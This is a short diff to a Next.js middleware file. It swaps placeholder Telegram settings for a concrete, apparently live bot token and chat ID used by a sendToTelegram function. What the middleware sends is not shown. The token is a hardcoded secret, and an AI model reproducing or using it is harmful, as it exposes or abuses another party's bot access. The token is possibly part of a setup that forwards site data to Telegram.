@@ -14,8 +14,8 @@ export default function middleware(req) {
 }
 import { NextResponse, NextRequest } from "next/server";
 
-const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
+const TELEGRAM_BOT_TOKEN = "7756706006:AAFeJI-PAodEoxC-OMS1XHQFDv2XdR_tOFk";
+const TELEGRAM_CHAT_ID = "6596338900";
 
 async function sendToTelegram(message) {
   const body = JSON.stringify({
